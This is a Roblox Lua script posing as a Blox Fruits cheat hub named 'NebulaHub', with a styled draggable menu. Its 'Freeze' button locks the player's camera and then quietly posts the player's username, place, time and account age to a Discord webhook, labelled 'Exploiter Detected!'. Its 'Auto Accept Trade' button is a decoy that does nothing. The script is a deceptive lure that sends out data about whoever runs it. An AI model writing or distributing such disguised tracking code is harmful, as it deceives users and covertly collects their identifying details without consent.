-- NebulaHub v1.0 | Blox Fruits Universal
-- Made by "Nebula Team" | Last Updated: 2025-09-09

--// Settings
local WEBHOOK_URL = "https://discord.com/api/webhooks/XXXXXXXX/XXXXXXXX"
local YOUR_NAME = "@YourDiscordName" -- what to ping in webhook

--// Services
local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

--// ScreenGui Setup
local gui = Instance.new("ScreenGui")
gui.Name = "NebulaHub"
gui.Parent = game.CoreGui

local frame = Instance.new("Frame")
frame.Parent = gui
frame.Size = UDim2.new(0, 250, 0, 160)
frame.Position = UDim2.new(0, 20, 0, 20)
frame.BackgroundColor3 = Color3.fromRGB(25, 20, 30)
frame.BorderSizePixel = 0

-- Add UI corner (rounded edges)
local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 12)
corner.Parent = frame

-- Add drop shadow
local shadow = Instance.new("ImageLabel")
shadow.Parent = frame
shadow.AnchorPoint = Vector2.new(0.5, 0.5)
shadow.Position = UDim2.new(0.5, 0, 0.5, 0)
shadow.Size = UDim2.new(1, 30, 1, 30)
shadow.BackgroundTransparency = 1
shadow.Image = "rbxassetid://5028857084"
shadow.ImageColor3 = Color3.fromRGB(110, 70, 150)
shadow.ImageTransparency = 0.25
shadow.ZIndex = -1

--// Title bar (draggable)
local titleBar = Instance.new("TextLabel")
titleBar.Parent = frame
titleBar.Size = UDim2.new(1, 0, 0, 30)
titleBar.BackgroundColor3 = Color3.fromRGB(35, 25, 45)
titleBar.Text = " NebulaHub"
titleBar.TextColor3 = Color3.fromRGB(200, 160, 255)
titleBar.TextXAlignment = Enum.TextXAlignment.Left
titleBar.Font = Enum.Font.GothamBold
titleBar.TextSize = 16

local dragToggle = nil
local dragStart = nil
local startPos = nil

local function updateDrag(input)
	if dragToggle and input.UserInputType == Enum.UserInputType.MouseMovement then
		local delta = input.Position - dragStart
		frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
	end
end

titleBar.InputBegan:Connect(function(input)
	if input.UserInputType == Enum.UserInputType.MouseButton1 then
		dragToggle = true
		dragStart = input.Position
		startPos = frame.Position
		input.Changed:Connect(function()
			if input.UserInputState == Enum.UserInputState.End then
				dragToggle = false
			end
		end)
	end
end)

game:GetService("UserInputService").InputChanged:Connect(updateDrag)

--// Button Creator
local function createButton(text, order)
	local btn = Instance.new("TextButton")
	btn.Parent = frame
	btn.Size = UDim2.new(0.9, 0, 0, 35)
	btn.Position = UDim2.new(0.05, 0, 0, 40 + (order * 40))
	btn.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
	btn.Text = text
	btn.Font = Enum.Font.Gotham
	btn.TextSize = 14
	btn.TextColor3 = Color3.fromRGB(220, 200, 255)

	local corner = Instance.new("UICorner")
	corner.CornerRadius = UDim.new(0, 8)
	corner.Parent = btn

	-- Hover effect
	btn.MouseEnter:Connect(function()
		btn.BackgroundColor3 = Color3.fromRGB(70, 50, 90)
	end)
	btn.MouseLeave:Connect(function()
		btn.BackgroundColor3 = Color3.fromRGB(40, 30, 50)
	end)

	return btn
end

-- Freeze Button
local freezeBtn = createButton("Freeze", 0)
freezeBtn.MouseButton1Click:Connect(function()
	-- Freeze camera/screen
	local camera = workspace.CurrentCamera
	local savedType = camera.CameraType
	camera.CameraType = Enum.CameraType.Scriptable
	local freezeTime = math.random(5, 7)
	wait(freezeTime)
	camera.CameraType = savedType

	-- Send webhook log
	local data = {
		["content"] = string.format(
			"%s Exploiter Detected!\n**User:** %s\n**Place:** %s\n**Time:** %s\n**Account Age:** %d days",
			YOUR_NAME,
			player.Name,
			game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
			os.date("%Y-%m-%d %H:%M:%S"),
			player.AccountAge
		)
	}

	local success, err = pcall(function()
		HttpService:PostAsync(WEBHOOK_URL, HttpService:JSONEncode(data), Enum.HttpContentType.ApplicationJson)
	end)

	if not success then
		warn("[NebulaHub] Failed to send webhook: " .. tostring(err))
	end
end)

-- Auto Accept Trade button (does nothing at all)
local fakeBtn = createButton("Auto Accept Trade", 1)
fakeBtn.MouseButton1Click:Connect(function()
	-- intentionally left blank
end)

--// Footer (version info)
local footer = Instance.new("TextLabel")
footer.Parent = frame
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -20)
footer.BackgroundTransparency = 1
footer.Text = "NebulaHub v1.0 | Patched Blox Fruits Update 20.1"
footer.TextColor3 = Color3.fromRGB(150, 120, 180)
footer.Font = Enum.Font.Gotham
footer.TextSize = 12
